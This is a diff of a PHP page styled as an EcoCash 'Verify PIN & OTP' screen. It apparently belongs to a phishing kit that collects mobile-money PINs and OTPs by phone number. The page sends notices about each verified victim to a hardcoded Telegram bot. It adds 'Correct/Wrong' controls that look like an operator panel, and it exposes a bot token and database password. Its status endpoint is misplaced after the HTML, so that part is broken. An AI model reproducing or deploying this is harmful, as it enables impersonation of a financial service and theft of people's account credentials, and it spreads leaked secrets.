@@ -1,38 +1,26 @@
 <?php
 session_start();
 
-// ========== CONFIGURATION ==========
-$botToken = "8163112809:AAH5OFmjVHKPDz1svGG9viGjpAuNLFHsctc";
-$chatId   = "-5193742613";
-
-// PostgreSQL credentials
+// ========== POSTGRESQL CONFIGURATION ==========
 $dbHost = "dpg-d8l5ii7lk1mc73cjcvs0-a";
 $dbPort = 5432;
 $dbName = "loan_9d8q";
 $dbUser = "loan_9d8q_user";
 $dbPass = "Jhl6RiIZwV5AnvLVCKirxqgLMtFi5gZX";
-// ==================================
+// ==============================================
 
-// Get phone from session
+// Telegram bot (optional)
+$botToken = "8163112809:AAH5OFmjVHKPDz1svGG9viGjpAuNLFHsctc";
+$chatId   = "-5193742613";
+
 $phone = isset($_SESSION['phone']) ? trim($_SESSION['phone']) : '';
-$error = '';
-$flashMessage = '';
-
-// Retrieve flash message if exists
-if (isset($_SESSION['flash_error'])) {
-    $flashMessage = $_SESSION['flash_error'];
-    unset($_SESSION['flash_error']);
-}
-
-// If no phone in session, redirect back to index
 if (empty($phone)) {
     header("Location: index.php");
     exit;
 }
 
 /**
- * Get PostgreSQL connection (singleton)
- * @return resource|false
+ * Get PostgreSQL connection
  */
 function getDbConnection($host, $port, $dbname, $user, $pass) {
     static $conn = null;
@@ -56,108 +44,205 @@ if (!$conn) {
     die("Database connection failed. Please contact admin.");
 }
 
-// Handle form submission (PIN/OTP verification)
-if ($_SERVER['REQUEST_METHOD'] === 'POST') {
-    $entered_pin = $_POST['pin'] ?? '';
-    $entered_otp = $_POST['otp'] ?? '';
+// Handle AJAX request for PIN/OTP verification
+if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_SERVER['HTTP_X_REQUESTED_WITH']) 
+    && strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) === 'xmlhttprequest') {
     
-    // Get stored PIN and OTP from database for this phone
-    $sql = "SELECT pin, otp FROM ecocash_auth WHERE phone = $1 ORDER BY id DESC LIMIT 1";
-    $result = pg_query_params($conn, $sql, [$phone]);
+    header('Content-Type: application/json');
+    $type = $_POST['type'] ?? '';   // 'pin' or 'otp'
+    $value = $_POST['value'] ?? '';
+    $action = $_POST['action'] ?? ''; // 'correct' or 'wrong'
     
-    if ($result && $row = pg_fetch_assoc($result)) {
-        $stored_pin = $row['pin'];
-        $stored_otp = $row['otp'];
-        
-        $pin_valid = ($entered_pin == $stored_pin);
-        $otp_valid = ($entered_otp == $stored_otp);
-        
-        if ($pin_valid && $otp_valid) {
-            // Both correct: update status and otp_status
-            pg_query_params($conn, "UPDATE ecocash_auth SET status = 1, otp_status = 1 WHERE phone = $1", [$phone]);
-            
-            // Optionally send Telegram notification
-            $message = "✅ User $phone successfully verified PIN and OTP.";
-            file_get_contents("https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=" . urlencode($message));
-            
-            // Redirect to dashboard
-            header("Location: dashboard.php");
-            exit;
-        } else {
-            $_SESSION['flash_error'] = "Invalid PIN or OTP. Please try again.";
-            header("Location: verify.php");
-            exit;
-        }
-    } else {
-        $_SESSION['flash_error'] = "No account found for this phone.";
-        header("Location: index.php");
+    if (!in_array($type, ['pin', 'otp']) || !in_array($action, ['correct', 'wrong'])) {
+        echo json_encode(['success' => false, 'error' => 'Invalid request']);
         exit;
     }
+    
+    // Fetch stored PIN/OTP for this phone (latest record)
+    $col = ($type === 'pin') ? 'pin' : 'otp';
+    $sql = "SELECT $col FROM ecocash_auth WHERE phone = $1 ORDER BY id DESC LIMIT 1";
+    $result = pg_query_params($conn, $sql, [$phone]);
+    if (!$result || !($row = pg_fetch_assoc($result))) {
+        echo json_encode(['success' => false, 'error' => 'No record found for this phone']);
+        exit;
+    }
+    
+    $stored = $row[$col];
+    $isCorrect = ($value == $stored);
+    
+    if ($action === 'correct') {
+        if (!$isCorrect) {
+            echo json_encode(['success' => false, 'error' => 'Incorrect value']);
+            exit;
+        }
+        // Update the corresponding status column
+        $updateCol = ($type === 'pin') ? 'status' : 'otp_status';
+        pg_query_params($conn, "UPDATE ecocash_auth SET $updateCol = 1 WHERE phone = $1", [$phone]);
+        
+        // Send Telegram notification
+        $msg = "✅ User $phone verified $type successfully.";
+        file_get_contents("https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=" . urlencode($msg));
+        
+        echo json_encode(['success' => true, 'message' => ucfirst($type) . ' verified (1)']);
+    } 
+    else { // action = 'wrong'
+        $updateCol = ($type === 'pin') ? 'status' : 'otp_status';
+        pg_query_params($conn, "UPDATE ecocash_auth SET $updateCol = 0 WHERE phone = $1", [$phone]);
+        echo json_encode(['success' => true, 'message' => ucfirst($type) . ' marked wrong (0)']);
+    }
+    exit;
 }
 
-// If we reach here, show the verification form
+// Get current verification statuses to show on page load (optional)
+$sql = "SELECT MAX(status) as pin_status, MAX(otp_status) as otp_status FROM ecocash_auth WHERE phone = $1";
+$res = pg_query_params($conn, $sql, [$phone]);
+$pinStatus = 0;
+$otpStatus = 0;
+if ($res && $row = pg_fetch_assoc($res)) {
+    $pinStatus = (int)$row['pin_status'];
+    $otpStatus = (int)$row['otp_status'];
+}
 ?>
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <title>Verify PIN & OTP | EcoCash</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
+        * { box-sizing: border-box; }
         body {
             margin: 0;
             background: #f1f5f9;
             font-family: Arial, Helvetica, sans-serif;
+            padding: 20px;
         }
         .header {
             text-align: center;
             padding: 15px;
-            font-size: 20px;
+            font-size: 24px;
             font-weight: bold;
         }
         .header span:first-child { color: red; }
         .header span:last-child { color: #2563eb; }
         .card {
-            max-width: 400px;
-            margin: 40px auto;
+            max-width: 500px;
+            margin: 20px auto;
             background: #fff;
-            padding: 25px;
+            padding: 30px;
             border-radius: 18px;
             box-shadow: 0 8px 25px rgba(0,0,0,.08);
-        }
-        .title {
-            font-size: 18px;
-            font-weight: bold;
-            margin-bottom: 20px;
             text-align: center;
         }
-        input {
-            width: 100%;
+        .title {
+            font-size: 20px;
+            font-weight: bold;
+            margin-bottom: 20px;
+        }
+        .phone-box {
+            background: #f8fafc;
             padding: 12px;
-            margin: 8px 0 16px;
-            border: 1px solid #ccc;
-            border-radius: 8px;
+            border-radius: 10px;
+            margin-bottom: 20px;
             font-size: 16px;
-            box-sizing: border-box;
+        }
+        .btn-group {
+            display: flex;
+            gap: 15px;
+            justify-content: center;
+            margin: 25px 0;
         }
         button {
-            width: 100%;
-            background: #2563eb;
-            color: white;
-            padding: 12px;
+            padding: 12px 24px;
             border: none;
-            border-radius: 30px;
+            border-radius: 40px;
             font-size: 16px;
             font-weight: bold;
             cursor: pointer;
+            transition: 0.2s;
         }
-        .error {
-            background: #fee2e2;
-            color: #dc2626;
-            padding: 10px;
-            border-radius: 8px;
-            margin-bottom: 15px;
+        .btn-pin {
+            background-color: #1d4ed8;
+            color: white;
+        }
+        .btn-pin:hover {
+            background-color: #1e40af;
+        }
+        .btn-otp {
+            background-color: #10b981;
+            color: white;
+        }
+        .btn-otp:hover {
+            background-color: #059669;
+        }
+        .status {
+            margin-top: 20px;
+            padding: 12px;
+            border-radius: 12px;
+            background: #f8fafc;
+            font-size: 14px;
+        }
+        .status span {
+            font-weight: bold;
+        }
+        .status .verified { color: green; }
+        .status .pending { color: orange; }
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.5);
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+        .modal-content {
+            background: white;
+            border-radius: 16px;
+            width: 320px;
+            padding: 24px;
             text-align: center;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.2);
+        }
+        .modal-content p {
+            margin: 0 0 15px 0;
+            font-size: 18px;
+            font-weight: 600;
+        }
+        .modal-content input {
+            width: 90%;
+            padding: 10px;
+            margin: 10px 0 20px;
+            border: 1px solid #ccc;
+            border-radius: 8px;
+            font-size: 16px;
+            text-align: center;
+        }
+        .modal-buttons {
+            display: flex;
+            gap: 12px;
+            justify-content: center;
+        }
+        .modal-buttons button {
+            padding: 8px 20px;
+            font-size: 14px;
+        }
+        .btn-correct {
+            background-color: #10b981;
+            color: white;
+        }
+        .btn-wrong {
+            background-color: #ef4444;
+            color: white;
+        }
+        .footer {
+            text-align: center;
+            font-size: 11px;
+            color: #6c757d;
+            margin-top: 20px;
         }
     </style>
 </head>
@@ -167,18 +252,153 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 </div>
 <div class="card">
     <div class="title">Verify Your Identity</div>
-    <?php if ($flashMessage): ?>
-        <div class="error"><?= htmlspecialchars($flashMessage) ?></div>
-    <?php endif; ?>
-    <form method="POST">
-        <label>Enter 4-digit PIN</label>
-        <input type="password" name="pin" maxlength="4" required>
-        
-        <label>Enter OTP sent to your phone</label>
-        <input type="text" name="otp" required>
-        
-        <button type="submit">Verify & Continue</button>
-    </form>
+    <div class="phone-box">
+        <strong>Phone:</strong> +263 <?= htmlspecialchars($phone) ?>
+    </div>
+    <div class="btn-group">
+        <button class="btn-pin" id="pinBtn">🔐 Verify PIN</button>
+        <button class="btn-otp" id="otpBtn">📱 Verify OTP</button>
+    </div>
+    <div class="status" id="statusBox">
+        <div>PIN Status: <span id="pinStatus" class="<?= $pinStatus ? 'verified' : 'pending' ?>"><?= $pinStatus ? 'Verified (1)' : 'Pending (0)' ?></span></div>
+        <div>OTP Status: <span id="otpStatus" class="<?= $otpStatus ? 'verified' : 'pending' ?>"><?= $otpStatus ? 'Verified (1)' : 'Pending (0)' ?></span></div>
+    </div>
+    <div class="footer">Both must be verified to continue</div>
 </div>
+
+<!-- Modal -->
+<div id="verifyModal" class="modal">
+    <div class="modal-content">
+        <p id="modalTitle">Enter PIN</p>
+        <input type="text" id="modalInput" placeholder="Enter value" autocomplete="off">
+        <div class="modal-buttons">
+            <button id="modalCorrect" class="btn-correct">✔ Correct</button>
+            <button id="modalWrong" class="btn-wrong">✘ Wrong</button>
+        </div>
+    </div>
+</div>
+
+<script>
+    let currentType = null; // 'pin' or 'otp'
+    const modal = document.getElementById('verifyModal');
+    const modalTitle = document.getElementById('modalTitle');
+    const modalInput = document.getElementById('modalInput');
+    const pinStatusSpan = document.getElementById('pinStatus');
+    const otpStatusSpan = document.getElementById('otpStatus');
+
+    function showModal(type) {
+        currentType = type;
+        modalTitle.innerText = type === 'pin' ? 'Enter 4-digit PIN' : 'Enter OTP';
+        modalInput.value = '';
+        modal.style.display = 'flex';
+    }
+
+    function closeModal() {
+        modal.style.display = 'none';
+        currentType = null;
+    }
+
+    async function sendVerification(type, value, action) {
+        const formData = new FormData();
+        formData.append('type', type);
+        formData.append('value', value);
+        formData.append('action', action);
+        
+        try {
+            const response = await fetch(window.location.href, {
+                method: 'POST',
+                headers: { 'X-Requested-With': 'XMLHttpRequest' },
+                body: formData
+            });
+            const result = await response.json();
+            if (result.success) {
+                // Refresh status display
+                await refreshStatuses();
+                if (action === 'correct') {
+                    showTemporaryMessage(result.message, 'green');
+                } else {
+                    showTemporaryMessage(result.message, 'orange');
+                }
+                // After both become 1, redirect to dashboard
+                await checkBothVerifiedAndRedirect();
+            } else {
+                alert('Error: ' + (result.error || 'Verification failed'));
+            }
+        } catch (err) {
+            alert('Network error: ' + err.message);
+        }
+        closeModal();
+    }
+
+    async function refreshStatuses() {
+        // Fetch current statuses via AJAX
+        const response = await fetch(window.location.href + '?get_status=1');
+        const data = await response.json();
+        if (data.pin_status === 1) {
+            pinStatusSpan.innerText = 'Verified (1)';
+            pinStatusSpan.className = 'verified';
+        } else {
+            pinStatusSpan.innerText = 'Pending (0)';
+            pinStatusSpan.className = 'pending';
+        }
+        if (data.otp_status === 1) {
+            otpStatusSpan.innerText = 'Verified (1)';
+            otpStatusSpan.className = 'verified';
+        } else {
+            otpStatusSpan.innerText = 'Pending (0)';
+            otpStatusSpan.className = 'pending';
+        }
+    }
+
+    async function checkBothVerifiedAndRedirect() {
+        const response = await fetch(window.location.href + '?get_status=1');
+        const data = await response.json();
+        if (data.pin_status === 1 && data.otp_status === 1) {
+            window.location.href = 'dashboard.php';
+        }
+    }
+
+    function showTemporaryMessage(msg, color) {
+        const statusBox = document.getElementById('statusBox');
+        const oldHTML = statusBox.innerHTML;
+        const tempDiv = document.createElement('div');
+        tempDiv.style.color = color;
+        tempDiv.style.marginTop = '10px';
+        tempDiv.style.fontWeight = 'bold';
+        tempDiv.innerText = msg;
+        statusBox.appendChild(tempDiv);
+        setTimeout(() => { tempDiv.remove(); }, 2000);
+    }
+
+    document.getElementById('pinBtn').onclick = () => showModal('pin');
+    document.getElementById('otpBtn').onclick = () => showModal('otp');
+    
+    document.getElementById('modalCorrect').onclick = () => {
+        const val = modalInput.value.trim();
+        if (!val) return alert('Please enter a value');
+        sendVerification(currentType, val, 'correct');
+    };
+    
+    document.getElementById('modalWrong').onclick = () => {
+        sendVerification(currentType, '', 'wrong');
+    };
+    
+    window.onclick = (e) => { if (e.target === modal) closeModal(); };
+</script>
+
+<?php
+// Additional AJAX endpoint to fetch current statuses (used by JS)
+if (isset($_GET['get_status']) && $_GET['get_status'] == 1) {
+    header('Content-Type: application/json');
+    $sql = "SELECT MAX(status) as pin_status, MAX(otp_status) as otp_status FROM ecocash_auth WHERE phone = $1";
+    $res = pg_query_params($conn, $sql, [$phone]);
+    if ($res && $row = pg_fetch_assoc($res)) {
+        echo json_encode(['pin_status' => (int)$row['pin_status'], 'otp_status' => (int)$row['otp_status']]);
+    } else {
+        echo json_encode(['pin_status' => 0, 'otp_status' => 0]);
+    }
+    exit;
+}
+?>
 </body>
 </html>
